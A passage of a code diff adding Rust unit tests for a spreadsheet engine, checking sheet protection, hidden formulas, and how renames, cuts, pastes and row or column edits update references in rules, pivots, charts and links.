+        sh.hyperlinks.insert(a1, link());
+        sh.hyperlinks.insert(c5, link());
+    }
+    s.execute("review.newNote", json!({"cell": "C5", "text": "note", "author": "Example"})).unwrap();
+    // Ranges are added before protecting: a protected sheet refuses `add`.
+    s.execute("review.allowEditRanges", json!({"action": "add", "title": "Open", "range": "A1"})).unwrap();
+    s.execute("review.allowEditRanges", json!({"action": "add", "title": "Kept", "range": "C5", "password": "example"})).unwrap();
+    s.execute("review.protectSheet", json!({})).unwrap();
+
+    s.execute("edit.clearHyperlinks", json!({"range": "A1"})).unwrap();
+    assert!(s.execute("edit.clearComments", json!({"range": "C5"})).is_err(), "a password range stays locked until unlocked");
+    s.execute("review.allowEditRanges", json!({"action": "unlock", "title": "Kept", "password": "example"})).unwrap();
+    s.execute("edit.clearHyperlinks", json!({"range": "C5"})).unwrap();
+    s.execute("edit.clearComments", json!({"range": "C5"})).unwrap();
+    let sh = s.doc().unwrap().wb.active().unwrap().clone();
+    assert!(sh.hyperlinks.is_empty() && sh.comments.is_empty());
+}
+
+#[test]
+fn replace_does_not_search_hidden_formula_source() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "=SEQUENCE(3)*7"})).unwrap();
+    s.execute("home.formatCells", json!({"range": "A1", "style": {"protection": {"locked": true, "hidden": true}}})).unwrap();
+    s.execute("review.protectSheet", json!({})).unwrap();
+    // Both give the same answer, and it is not an error: a hidden formula's source is not searched.
+    let hit = s.execute("edit.replace", json!({"what": "SEQUENCE", "with": "X"})).unwrap();
+    let miss = s.execute("edit.replace", json!({"what": "NOSUCHTEXT", "with": "X"})).unwrap();
+    assert_eq!(hit, miss);
+    assert_eq!(hit["replaced"], json!(0), "{hit}");
+}
+
+#[test]
+fn formulatext_does_not_reveal_a_hidden_formula() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "=1+1"})).unwrap();
+    s.execute("home.formatCells", json!({"range": "A1", "style": {"protection": {"locked": false, "hidden": true}}})).unwrap();
+    s.execute("home.formatCells", json!({"range": "B1", "style": {"protection": {"locked": false}}})).unwrap();
+    s.execute("cell.set", json!({"cell": "B1", "input": "=FORMULATEXT(A1)"})).unwrap();
+    assert_eq!(v(&s, "B1"), Value::from("=1+1"), "not protected yet");
+    s.execute("review.protectSheet", json!({})).unwrap();
+    // Without entering the formula again: protecting recalculates what reads the protection.
+    assert_eq!(v(&s, "B1"), Value::Error(gridcraft_core::CellError::NA));
+    s.execute("cell.set", json!({"cell": "B1", "input": "=FORMULATEXT(A1)"})).unwrap();
+    assert_eq!(v(&s, "B1"), Value::Error(gridcraft_core::CellError::NA));
+    s.execute("review.unprotectSheet", json!({})).unwrap();
+    assert_eq!(v(&s, "B1"), Value::from("=1+1"), "unprotecting shows it again without re-entering");
+}
+
+#[test]
+fn protected_sheet_refuses_layout_commands_its_permissions_do_not_allow() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["h"], [1], [2]]})).unwrap();
+    s.execute("data.filter", json!({"range": "A1:A3"})).unwrap();
+    s.execute("review.protectSheet", json!({})).unwrap();
+    for (id, params) in [
+        ("home.rowHeight", json!({"rows": "1:1", "height": 40})),
+        ("home.columnWidth", json!({"cols": "A:A", "width": 80})),
+        ("data.group", json!({"rows": "2:3"})),
+        ("data.showLevels", json!({"rows": 1})),
+        ("data.clearFilter", json!({})),
+        ("data.reapply", json!({})),
+        ("insert.picture", json!({"base64": "iVBORw0KGgo="})),
+    ] {
+        let err = s.execute(id, params).expect_err(id).to_string();
+        assert!(err.contains("protected"), "{id}: {err}");
+    }
+    // With the permissions ticked the same layout commands run.
+    s.execute("review.unprotectSheet", json!({})).unwrap();
+    s.execute("review.protectSheet", json!({"formatRows": true, "formatColumns": true, "autofilter": true})).unwrap();
+    for (id, params) in [
+        ("home.rowHeight", json!({"rows": "1:1", "height": 40})),
+        ("home.columnWidth", json!({"cols": "A:A", "width": 80})),
+        ("data.reapply", json!({})),
+    ] {
+        s.execute(id, params).unwrap_or_else(|e| panic!("{id}: {e}"));
+    }
+}
+
+#[test]
+fn an_edit_range_limited_to_windows_users_stays_locked() {
+    use gridcraft_model::EditRange;
+    let mut s = s();
+    let a1 = CellRef::parse("A1").unwrap();
+    let range = |sd: Option<&str>| EditRange {
+        title: "T".into(),
+        ranges: vec![gridcraft_core::RangeRef::cell(a1)],
+        password: None,
+        security_descriptor: sd.map(str::to_string),
+    };
+    let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
+    sh.edit_ranges.push(range(None));
+    assert!(crate::cmd::locked_cell_error(sh, a1, &[]).is_none(), "an open range");
+    sh.edit_ranges = vec![range(Some("D:(A;;GA;;;WD)"))];
+    assert!(crate::cmd::locked_cell_error(sh, a1, &[]).is_some(), "a user-limited range");
+}
+
+#[test]
+fn pivot_new_sheet_destination_respects_workbook_structure_protection() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["Region", "Sales"], ["N", 1], ["S", 2]]})).unwrap();
+    s.execute("review.protectWorkbook", json!({"on": true})).unwrap();
+    for dest in ["new", "NEW", " new ", ""] {
+        assert!(s.execute("insert.pivotTable", json!({"source": "A1:B3", "destination": dest})).is_err(), "destination {dest:?}");
+    }
+    assert!(s.execute("insert.pivotTable", json!({"source": "A1:B3", "location": "New"})).is_err());
+}
+
+/// Renaming a sheet renames a PivotTable's source to it, and the PivotTable still refreshes.
+#[test]
+fn sheet_rename_renames_a_pivot_source() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1:B3", "values": [["Region", "Sales"], ["East", 1], ["West", 2]]})).unwrap();
+    s.execute("insert.pivotTable", json!({"source": "Sheet1!$A$1:$B$3", "destination": "Sheet1!E3", "rows": ["Region"], "values": ["Sales"]}))
+        .unwrap();
+    s.execute("sheet.rename", json!({"name": "Data"})).unwrap();
+    let wb = &s.doc().unwrap().wb;
+    assert_eq!(wb.sheets[0].pivots[0].source, "Data!$A$1:$B$3");
+    s.execute("pivot.refresh", json!({})).unwrap();
+}
+
+/// A defined name's references are on no sheet, whatever a sheet is called: inserting rows on
+/// a sheet named with a control character leaves a name's unqualified reference alone.
+#[test]
+fn names_are_on_no_sheet_whatever_the_sheet_is_called() {
+    let mut s = s();
+    s.execute("formulas.defineName", json!({"name": "Nm", "refersTo": "=$A$1"})).unwrap();
+    let before = s.doc().unwrap().wb.names.iter().find(|n| n.name == "Nm").map(|n| n.formula.clone());
+    s.execute("sheet.rename", json!({"sheet": 0, "name": "\u{0}"})).unwrap();
+    s.execute("home.insertRows", json!({"rows": "1:1"})).unwrap();
+    let after = s.doc().unwrap().wb.names.iter().find(|n| n.name == "Nm").map(|n| n.formula.clone());
+    assert!(before.is_some());
+    assert_eq!(before, after);
+}
+
+/// Renaming a sheet copies only the sheets whose references change: a sheet that doesn't name
+/// it stays shared with the undo snapshot.
+#[test]
+fn sheet_rename_leaves_untouched_sheets_shared() {
+    let mut s = s();
+    s.execute("home.insertSheet", json!({"name": "Other"})).unwrap();
+    s.execute("home.insertSheet", json!({"name": "Third"})).unwrap();
+    s.execute("cell.set", json!({"cell": "Other!A1", "input": "=Sheet1!A1+1"})).unwrap();
+    // A constant: the full recalculation after a rename writes every formula cell's value, which
+    // copies a sheet that holds formulas whatever the rewrite does.
+    s.execute("cell.set", json!({"cell": "Third!A1", "input": "5"})).unwrap();
+    let before = s.doc().unwrap().wb.clone();
+    s.execute("sheet.rename", json!({"sheet": "Sheet1", "name": "Data"})).unwrap();
+    let wb = &s.doc().unwrap().wb;
+    let shared = |name: &str| std::sync::Arc::ptr_eq(&wb.sheets[wb.sheet_index(name).unwrap()], &before.sheets[before.sheet_index(name).unwrap()]);
+    assert!(shared("Third"), "Third doesn't name Sheet1");
+    assert!(!shared("Other"), "Other's formula names Sheet1");
+}
+
+/// Every edit that moves references moves those in conditional formats and validation too:
+/// inserting rows, renaming a name, deleting a sheet; and deleting a sheet leaves arrays be.
+#[test]
+fn reference_edits_reach_conditional_formats_and_validation() {
+    let mut s = s();
+    s.execute("home.insertSheet", json!({"name": "Lists"})).unwrap();
+    s.execute("range.setValues", json!({"range": "Lists!A1:A3", "values": [["a"], ["b"], ["c"]]})).unwrap();
+    s.execute("sheet.activate", json!({"sheet": 1})).ok();
+    let sheet1 = s.doc().unwrap().wb.sheet_index("Sheet1").unwrap();
+    s.execute("sheet.activate", json!({"sheet": sheet1})).ok();
+    s.execute("formulas.defineName", json!({"name": "Opts", "refersTo": "=Lists!$A$1:$A$3"})).unwrap();
+    s.execute("data.validation", json!({"range": "Sheet1!B1:B5", "type": "list", "formula1": "=Opts"})).unwrap();
+    s.execute("data.validation", json!({"range": "Sheet1!E1:E5", "type": "list", "formula1": "=Lists!$A$1:$A$3"})).unwrap();
+    s.execute(
+        "home.conditionalFormat",
+        json!({"range": "Sheet1!C1:C5", "rule": {"type": "expression", "formula": "=C1>$D$3"}, "style": {"fill": "#FFC7CE"}}),
+    )
+    .unwrap();
+    s.execute("cell.set", json!({"cell": "Sheet1!G2", "input": "=B2:B3*2", "array": true})).unwrap();
+    let sh = |s: &Session| s.doc().unwrap().wb.sheet(s.doc().unwrap().wb.sheet_index("Sheet1").unwrap()).cloned().unwrap();
+    // Inserting a row above moves the rule's references with its range.
+    s.execute("home.insertRows", json!({"rows": "1:1", "sheet": "Sheet1"})).unwrap();
+    let rule = match &sh(&s).cond_formats[0].rule {
+        gridcraft_model::CfRule::Expression { formula, .. } => formula.clone(),
+        _ => String::new(),
+    };
+    assert_eq!(rule.trim_start_matches('='), "C2>$D$4");
+    // Renaming a name renames it in validation lists.
+    s.execute("formulas.defineName", json!({"name": "Choices", "oldName": "Opts", "refersTo": "=Lists!$A$1:$A$3"})).unwrap();
+    assert!(sh(&s).validations.iter().any(|v| v.f1.trim_start_matches('=') == "Choices"));
+    // Deleting the sheet a list comes from makes it #REF!, and keeps the array formula.
+    let array_before = sh(&s).cells.iter().find_map(|(_, c)| c.formula.as_ref().and_then(|f| f.array));
+    assert!(array_before.is_some());
+    let lists = s.doc().unwrap().wb.sheet_index("Lists").unwrap();
+    s.execute("home.deleteSheet", json!({"sheet": lists})).unwrap();
+    assert!(sh(&s).validations.iter().any(|v| v.f1.contains("#REF!")), "{:?}", sh(&s).validations.iter().map(|v| v.f1.clone()).collect::<Vec<_>>());
+    assert_eq!(sh(&s).cells.iter().find_map(|(_, c)| c.formula.as_ref().and_then(|f| f.array)), array_before);
+}
+
+/// A copied sheet's chart plots the copy's data.
+#[test]
+fn a_copied_sheets_chart_plots_the_copy() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1:B3", "values": [["x", "y"], ["a", 1], ["b", 2]]})).unwrap();
+    s.execute("insert.chart", json!({"range": "A1:B3", "type": "column"})).unwrap();
+    // A series name written as a formula on no sheet keeps its `=`, and stays a reference.
+    std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap().charts[0].series[0].name = Some("=A1".into());
+    s.execute("sheet.move", json!({"sheet": 0, "to": 1, "copy": true})).unwrap();
+    let wb = &s.doc().unwrap().wb;
+    let copy = wb.sheets.iter().find(|sh| sh.name != "Sheet1").unwrap();
+    assert!(copy.charts[0].series[0].values.contains(&copy.name), "{}", copy.charts[0].series[0].values);
+    assert_eq!(copy.charts[0].series[0].name.as_deref(), Some("=A1"));
+}
+
+/// A rule's formulas follow its ranges: deleting its top-left row re-hosts them at the cell
+/// that takes its place, and a cut takes rules with their cells, moving their references once.
+#[test]
+fn rule_formulas_follow_their_ranges() {
+    let rule_text = |s: &Session| -> (Vec<String>, Vec<String>) {
+        let sh = s.doc().unwrap().wb.sheets[0].clone();
+        let cf = sh.cond_formats.iter().map(|c| match &c.rule {
+            gridcraft_model::CfRule::Expression { formula, .. } => {
+                format!("{}@{}", formula.trim_start_matches('='), c.ranges.iter().map(|r| r.a1()).collect::<Vec<_>>().join(","))
+            }
+            _ => String::new(),
+        });
+        let dv = sh
+            .validations
+            .iter()
+            .map(|v| format!("{}@{}", v.f1.trim_start_matches('='), v.ranges.iter().map(|r| r.a1()).collect::<Vec<_>>().join(",")));
+        (cf.collect(), dv.collect())
+    };
+    let mut s = s();
+    s.execute("home.conditionalFormat", json!({"range": "A2:A5", "rule": {"type": "expression", "formula": "=B2>0"}, "style": {"fill": "#FFC7CE"}}))
+        .unwrap();
+    s.execute("data.validation", json!({"range": "C2:C5", "type": "custom", "formula1": "=D2>0"})).unwrap();
+    s.execute("home.deleteRows", json!({"rows": "2:2"})).unwrap();
+    assert_eq!(rule_text(&s), (vec!["B2>0@A2:A4".to_string()], vec!["D2>0@C2:C4".to_string()]));
+    // Cut A2:A4 to F2: the rule goes with the cells, still testing the cells beside them.
+    s.execute("edit.cut", json!({"range": "A2:A4"})).unwrap();
+    s.execute("edit.paste", json!({"at": "F2"})).unwrap();
+    assert_eq!(rule_text(&s).0, vec!["B2>0@F2:F4".to_string()]);
+    // An overlapping cut moves a self-referring rule's reference once.
+    let mut s = super::tests::s();
+    s.execute("data.validation", json!({"range": "A1:A2", "type": "custom", "formula1": "=A1>0"})).unwrap();
+    s.execute("edit.cut", json!({"range": "A1:A2"})).unwrap();
+    s.execute("edit.paste", json!({"at": "A2"})).unwrap();
+    assert_eq!(rule_text(&s).1, vec!["A2>0@A2:A3".to_string()]);
+}
+
+/// Renaming a table renames every reference to it (a PivotTable's source, a name, a rule) and
+/// leaves formulas that don't name it, legacy arrays included, as they are.
+#[test]
+fn table_rename_renames_every_reference() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1:B3", "values": [["k", "v"], ["a", 1], ["b", 2]]})).unwrap();
+    s.execute("insert.table", json!({"range": "A1:B3"})).unwrap();
+    let table = s.doc().unwrap().wb.sheets[0].tables[0].name.clone();
+    s.execute("cell.set", json!({"cell": "D1", "input": "=A2:A3", "array": true})).unwrap();
+    s.execute("formulas.defineName", json!({"name": "Tot", "refersTo": format!("=SUM({table}[v])")})).unwrap();
+    s.execute(
+        "home.conditionalFormat",
+        json!({"range": "F1:F3", "rule": {"type": "expression", "formula": format!("=COUNT({table}[v])>0")}, "style": {"fill": "#FFC7CE"}}),
+    )
+    .unwrap();
+    s.execute("insert.pivotTable", json!({"source": table, "destination": "Sheet1!H3", "rows": ["k"], "values": ["v"]})).unwrap();
+    let array = s.doc().unwrap().wb.sheets[0].cell(CellRef::new(0, 3)).and_then(|c| c.formula.clone()).unwrap();
+    s.execute("table.rename", json!({"table": table, "name": "Data"})).unwrap();
+    let wb = &s.doc().unwrap().wb;
+    let sh = &wb.sheets[0];
+    assert_eq!(
+        sh.cell(CellRef::new(0, 3)).and_then(|c| c.formula.clone()).map(|f| (f.text.clone(), f.array, f.dynamic)),
+        Some((array.text.clone(), array.array, array.dynamic))
+    );
+    assert_eq!(wb.names.iter().find(|n| n.name == "Tot").map(|n| n.formula.clone()).as_deref(), Some("SUM(Data[v])"));
+    assert!(matches!(&sh.cond_formats[0].rule, gridcraft_model::CfRule::Expression { formula, .. } if formula.contains("Data[v]")));
+    assert_eq!(sh.pivots[0].source, "Data");
+    s.execute("data.refreshAll", json!({})).unwrap();
+}
+
+/// Rules moved whole keep their formulas; a range an edit leaves in place keeps them too;
+/// thresholds are read as written; a cut to another sheet names the source sheet's cells.
+#[test]
+fn rules_moved_whole_or_left_in_place_keep_their_formulas() {
+    let cf = |s: &Session, sheet: usize| -> Vec<String> {
+        s.doc().unwrap().wb.sheets[sheet]
+            .cond_formats
+            .iter()
+            .map(|c| match &c.rule {
+                gridcraft_model::CfRule::Expression { formula, .. } => {
+                    format!("{}@{}", formula.trim_start_matches('='), c.ranges.iter().map(|r| r.a1()).collect::<Vec<_>>().join(","))
+                }
+                gridcraft_model::CfRule::DataBar { min: gridcraft_model::CfValueKind::Formula(f), .. } => format!("bar {f}"),
+                _ => String::new(),
+            })
+            .collect()
+    };
+    let rule = |s: &mut Session, range: &str, f: &str| {
+        s.execute("home.clearRules", json!({"whole": true})).ok();
+        s.execute("home.conditionalFormat", json!({"range": range, "rule": {"type": "expression", "formula": f}, "style": {"fill": "#FFC7CE"}}))
+            .unwrap();
+    };
+    let mut s = s();
+    rule(&mut s, "B1:B5", "=C1>0");
+    s.execute("sheet.moveColumns", json!({"cols": "B:B", "before": 4})).unwrap();
+    // The column moved whole: the rule tests the column that was beside it (C, now B), as a
+    // formula there would.
+    assert_eq!(cf(&s, 0), vec!["B1>0@D1:D5".to_string()]);
+    let mut s = super::tests::s();
+    rule(&mut s, "A1:C1", "=B1>0");
+    s.execute("home.deleteCells", json!({"range": "A1", "shift": "up"})).unwrap();
+    assert_eq!(cf(&s, 0), vec!["B1>0@A1:C1".to_string()]);
+    // A data bar's threshold formula is read as written: deleting the first row only moves it.
+    let mut s = super::tests::s();
+    s.execute("home.conditionalFormat", json!({"range": "A1:A10", "rule": {"type": "dataBar", "min": {"type": "formula", "value": "MIN(C1:C10)"}}}))
+        .unwrap();
+    assert_eq!(cf(&s, 0), vec!["bar MIN(C1:C10)".to_string()]);
+    s.execute("home.deleteRows", json!({"rows": "1:1"})).unwrap();
+    assert_eq!(cf(&s, 0), vec!["bar MIN(C1:C9)".to_string()]);
+    // A cut to another sheet: the rule still reads the source sheet's cells.
+    let mut s = super::tests::s();
+    s.execute("home.insertSheet", json!({"name": "Two"})).unwrap();
+    let one = s.doc().unwrap().wb.sheet_index("Sheet1").unwrap();
+    let two = s.doc().unwrap().wb.sheet_index("Two").unwrap();
+    s.execute("sheet.activate", json!({"sheet": one})).ok();
+    s.execute(
+        "home.conditionalFormat",
+        json!({"range": "Sheet1!A2:A4", "rule": {"type": "expression", "formula": "=B2>0"}, "style": {"fill": "#FFC7CE"}}),
+    )
+    .unwrap();
+    s.execute("edit.cut", json!({"range": "Sheet1!A2:A4"})).unwrap();
+    s.execute("sheet.activate", json!({"sheet": two})).unwrap();
+    s.execute("edit.paste", json!({"at": "F2"})).unwrap();
+    assert_eq!(cf(&s, two), vec!["Sheet1!B2>0@F2:F4".to_string()]);
+    // A data bar's threshold goes along too: its cells into the block, the others on Sheet1.
+    s.execute("sheet.activate", json!({"sheet": one})).unwrap();
+    s.execute(
+        "home.conditionalFormat",
+        json!({"range": "Sheet1!H1:H10", "rule": {"type": "dataBar", "min": {"type": "formula", "value": "MIN(H1:H10,C1:C10)"}}}),
+    )
+    .unwrap();
+    s.execute("edit.cut", json!({"range": "Sheet1!H1:H10"})).unwrap();
+    s.execute("sheet.activate", json!({"sheet": two})).unwrap();
+    s.execute("edit.paste", json!({"at": "K1"})).unwrap();
+    assert_eq!(cf(&s, two).last().map(String::as_str), Some("bar MIN(Two!K1:K10,Sheet1!C1:C10)"));
+}
+
+/// A cut moves the rules its cells hold when it is pasted, not those they held when it was cut.
+#[test]
+fn a_cut_moves_the_rules_its_cells_hold_at_paste() {
+    let mut s = s();
+    s.execute("home.conditionalFormat", json!({"range": "A1:A3", "rule": {"type": "expression", "formula": "=A1>0"}, "style": {"fill": "#FFC7CE"}}))
+        .unwrap();
+    s.execute("edit.cut", json!({"range": "A1:A3"})).unwrap();
+    s.execute("home.clearRules", json!({"whole": true})).unwrap();
+    s.execute("data.validation", json!({"range": "A1:A3", "type": "custom", "formula1": "=A1>0"})).unwrap();
+    s.execute("edit.paste", json!({"at": "D1"})).unwrap();
+    let sh = &s.doc().unwrap().wb.sheets[0];
+    assert!(sh.cond_formats.is_empty(), "a cleared rule came back: {:?}", sh.cond_formats);
+    let dv: Vec<String> = sh.validations.iter().flat_map(|v| v.ranges.iter().map(|r| r.a1())).collect();
+    assert_eq!(dv, vec!["D1:D3".to_string()]);
+}
+
+/// A cut whose sheet is renamed before the paste still moves its rules and the references to
+/// its cells: the move is made on the sheet as it is now named, not as the clipboard saw it.
+#[test]
+fn a_cut_pasted_after_its_sheet_is_renamed_moves_its_rules() {
+    let mut s = s();
+    s.execute("home.conditionalFormat", json!({"range": "A1:A3", "rule": {"type": "expression", "formula": "=A1>0"}, "style": {"fill": "#FFC7CE"}}))
+        .unwrap();
+    s.execute("data.validation", json!({"range": "A1:A3", "type": "custom", "formula1": "=A1>0"})).unwrap();
+    s.execute("cell.set", json!({"cell": "B5", "input": "=A1"})).unwrap();
+    s.execute("edit.cut", json!({"range": "A1:A3"})).unwrap();
+    s.execute("sheet.rename", json!({"name": "Data"})).unwrap();
+    s.execute("edit.paste", json!({"at": "D1"})).unwrap();
+    let sh = &s.doc().unwrap().wb.sheets[0];
+    let cf: Vec<String> = sh
+        .cond_formats
+        .iter()
+        .map(|c| match &c.rule {
+            gridcraft_model::CfRule::Expression { formula, .. } => format!("{}@{}", formula.trim_start_matches('='), c.ranges[0].a1()),
+            _ => String::new(),
+        })
+        .collect();
+    assert_eq!(cf, vec!["D1>0@D1:D3".to_string()]);
+    let dv: Vec<String> = sh.validations.iter().map(|v| format!("{}@{}", v.f1.trim_start_matches('='), v.ranges[0].a1())).collect();
+    assert_eq!(dv, vec!["D1>0@D1:D3".to_string()]);
+    assert_eq!(s.execute("cell.get", json!({"cell": "B5"})).unwrap()["formula"], "=D1");
+}
+
+/// Moving a column out of a wider rule takes its part of the rule with it, as a cut does: every
+/// cell, moved or not, still checks itself.
+#[test]
+fn moving_a_column_out_of_a_rule_keeps_every_cell_checking_itself() {
+    let mut s = s();
+    s.execute("data.validation", json!({"range": "A1:C3", "type": "custom", "formula1": "=A1>0"})).unwrap();
+    s.execute("sheet.moveColumns", json!({"cols": "A:A", "before": 4})).unwrap();
+    let ok = |s: &Session, at: &str, input: &str| {
+        crate::cmd::data::check_validation(&s.doc().unwrap().wb, 0, gridcraft_core::CellRef::parse(at).unwrap(), input).is_none()
+    };
+    // Old A is now D; old B and C are A and B.
+    for at in ["A1", "B2", "D3"] {
+        assert!(ok(&s, at, "5"), "{at} takes 5");
+        assert!(!ok(&s, at, "-5"), "{at} refuses -5");
+    }
+    // Moved left, a whole range of the rule becomes its top-left: the parts left behind still
+    // check themselves.
+    let mut s = super::tests::s();
+    s.execute("data.validation", json!({"range": "B1:B3,D1:D3", "type": "custom", "formula1": "=B1>0"})).unwrap();
+    s.execute("sheet.moveColumns", json!({"cols": "D:D", "before": 1})).unwrap();
+    for at in ["B1", "C2"] {
+        assert!(ok(&s, at, "5"), "{at} takes 5");
+        assert!(!ok(&s, at, "-5"), "{at} refuses -5");
+    }
+}
+
+/// A rule's formulas are written for the top-left of all its ranges: when an edit removes the
+/// range holding that cell, the rest re-host from it, not from their own top-left.
+#[test]
+fn rules_rehost_from_the_top_left_of_all_their_ranges() {
+    let texts = |s: &Session| -> (Vec<String>, Vec<String>) {
+        let sh = s.doc().unwrap().wb.sheets[0].clone();
+        let at = |ranges: &[gridcraft_core::RangeRef]| ranges.iter().map(|r| r.a1()).collect::<Vec<_>>().join(",");
+        let cf = sh.cond_formats.iter().map(|c| match &c.rule {
+            gridcraft_model::CfRule::Expression { formula, .. } => format!("{}@{}", formula.trim_start_matches('='), at(&c.ranges)),
+            _ => String::new(),
+        });
+        let dv = sh.validations.iter().map(|v| format!("{}@{}", v.f1.trim_start_matches('='), at(&v.ranges)));
+        (cf.collect(), dv.collect())
+    };
+    let setup = || {
+        let mut s = super::tests::s();
+        s.execute(
+            "home.conditionalFormat",
+            json!({"range": "A1:A5,C10:C12", "rule": {"type": "expression", "formula": "=A1>0"}, "style": {"fill": "#FFC7CE"}}),
+        )
+        .unwrap();
+        s.execute("data.validation", json!({"range": "A1:A5,E10:E12", "type": "custom", "formula1": "=A1>0"})).unwrap();
+        s
+    };
+    // Deleting the rows of the first area: the second keeps testing itself.
+    let mut s = setup();
+    s.execute("home.deleteRows", json!({"rows": "1:5"})).unwrap();
+    assert_eq!(texts(&s), (vec!["C5>0@C5:C7".to_string()], vec!["E5>0@E5:E7".to_string()]));
+    // Deleting the cells of the first area, shifting up or left: the second area stays put.
+    for shift in ["up", "left"] {
+        let mut s = setup();
+        s.execute("home.deleteCells", json!({"range": "A1:A5", "shift": shift})).unwrap();
+        assert_eq!(texts(&s), (vec!["C10>0@C10:C12".to_string()], vec!["E10>0@E10:E12".to_string()]), "shift {shift}");
+    }
+}
+
+/// A cut is pasted as it is: a transposed, tiled or skip-blanks paste of it is refused and
+/// changes nothing, so its rules never land on a block of another shape than its cells, nor
+/// replace a destination rule under a cell the paste leaves alone.
+#[test]
+fn a_cut_is_not_transposed_or_tiled() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1:C1", "values": [[1, 2, 3]]})).unwrap();
+    s.execute("home.conditionalFormat", json!({"range": "A1:C1", "rule": {"type": "expression", "formula": "=A1>0"}, "style": {"fill": "#FFC7CE"}}))
+        .unwrap();
+    s.execute("edit.cut", json!({"range": "A1:C1"})).unwrap();
+    assert!(s.execute("edit.pasteSpecial", json!({"what": "all", "transpose": true, "at": "E1"})).is_err());
+    assert!(s.execute("edit.pasteSpecial", json!({"what": "all", "skipBlanks": true, "at": "E1"})).is_err());
+    s.execute("selection.set", json!({"range": "E1:G2"})).unwrap();
+    assert!(s.execute("edit.pasteSpecial", json!({"what": "all"})).is_err());
+    let sh = s.doc().unwrap().wb.sheets[0].clone();
+    assert_eq!(sh.value(CellRef::new(0, 0)), Value::Number(1.0));
+    assert_eq!(sh.cond_formats[0].ranges.iter().map(|r| r.a1()).collect::<Vec<_>>(), vec!["A1:C1".to_string()]);
+    // Pasted as it is, the rule goes with the cells.
+    s.execute("edit.paste", json!({"at": "E1"})).unwrap();
+    assert_eq!(s.doc().unwrap().wb.sheets[0].cond_formats[0].ranges.iter().map(|r| r.a1()).collect::<Vec<_>>(), vec!["E1:G1".to_string()]);
+}
+
+/// Deleting cells in only the first column of a rule's range shifts its top-left cell and keeps the
+/// range's size: the rule's formula follows the cell now there, not the deleted one.
+#[test]
+fn a_rule_follows_its_top_left_through_a_partial_cell_delete() {
+    let mut s = s();
+    s.execute("home.conditionalFormat", json!({"range": "A1:C3", "rule": {"type": "expression", "formula": "=A1>0"}, "style": {"fill": "#FFC7CE"}}))
+        .unwrap();
+    s.execute("data.validation", json!({"range": "A1:C3", "type": "custom", "formula1": "=A1<>B1"})).unwrap();
+    s.execute("home.deleteCells", json!({"range": "A1", "shift": "up"})).unwrap();
+    let sh = s.doc().unwrap().wb.sheets[0].clone();
+    let rule = match &sh.cond_formats[0].rule {
+        gridcraft_model::CfRule::Expression { formula, .. } => formula.trim_start_matches('=').to_string(),
+        other => panic!("{other:?}"),
+    };
+    assert_eq!(rule, "A1>0");
+    // The cell now at A1 came from A2, which compared itself with B2 (column B didn't move).
+    assert_eq!(sh.validations[0].f1.trim_start_matches('='), "A1<>B2");
+}
+
+/// A column moved out of a rule's range takes its part of the rule reading what the column read:
+/// a rule on B1:D1 testing the cell to its left, with D moved before B, still tests old C (now D)
+/// at the moved cell, and a rule on the moved column alone still tests that column.
+#[test]
+fn a_moved_column_keeps_what_its_part_of_a_rule_reads() {
+    let mut s = s();
+    s.execute("home.conditionalFormat", json!({"range": "B1:D1", "rule": {"type": "expression", "formula": "=A1>0"}, "style": {"fill": "#FFC7CE"}}))
+        .unwrap();
+    s.execute("data.validation", json!({"range": "D2", "type": "custom", "formula1": "=D2>0"})).unwrap();
+    s.execute("sheet.moveColumns", json!({"cols": "D:D", "before": 1})).unwrap();
+    let sh = s.doc().unwrap().wb.sheets[0].clone();
+    let mut rules: Vec<String> = sh
+        .cond_formats
+        .iter()
+        .map(|c| match &c.rule {
+            gridcraft_model::CfRule::Expression { formula, .. } => {
+                format!("{}@{}", formula.trim_start_matches('='), c.ranges.iter().map(|r| r.a1()).collect::<Vec<_>>().join(","))
+            }
+            other => format!("{other:?}"),
+        })
+        .collect();
+    rules.sort();
+    assert_eq!(rules, vec!["A1>0@C1:D1".to_string(), "D1>0@B1".to_string()]);
+    assert_eq!(sh.validations[0].f1.trim_start_matches('='), "B2>0");
+}
+
+/// Internal hyperlinks keep the place they name as typed, as Excel's "Place in This Document"
+/// links do: renaming or deleting a sheet, or inserting rows, leaves them as they were.
+#[test]
+fn internal_link_targets_stay_as_typed() {
+    let mut s = s();
+    s.execute("home.insertSheet", json!({"name": "Lists"})).unwrap();
+    let one = s.doc().unwrap().wb.sheet_index("Sheet1").unwrap();
+    s.execute("insert.link", json!({"cell": "Sheet1!A1", "target": "Lists!B5"})).unwrap();
+    s.execute("insert.link", json!({"cell": "Sheet1!A2", "target": "Sheet1!C9"})).unwrap();
+    s.execute("home.insertRows", json!({"rows": "1:1", "sheet": "Sheet1"})).unwrap();
+    let lists = s.doc().unwrap().wb.sheet_index("Lists").unwrap();
+    s.execute("sheet.rename", json!({"sheet": lists, "name": "Data"})).unwrap();
+    s.execute("home.deleteSheet", json!({"sheet": lists})).unwrap();
+    let wb = &s.doc().unwrap().wb;
+    let one = wb.sheet_index("Sheet1").unwrap_or(one);
+    let mut targets: Vec<String> = wb.sheets[one].hyperlinks.values().map(|h| h.target.clone()).collect();
+    targets.sort();
+    assert_eq!(targets, vec!["Lists!B5".to_string(), "Sheet1!C9".to_string()]);
+}
+
+#[test]
+fn circle_invalid_says_when_its_scan_allowance_ended_early() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[-1]]})).unwrap();
+    s.execute("range.setValues", json!({"range": "A200000", "values": [[-1]]})).unwrap();
+    s.execute("data.validation", json!({"range": "A1:A5", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
+    let out = s.execute("data.circleInvalid", json!({})).unwrap();
+    assert_eq!((out["invalid"].as_array().map(Vec::len), out["truncated"].as_bool()), (Some(1), Some(false)), "{out}");
+    s.execute("data.validation", json!({"range": "A1:A200000", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
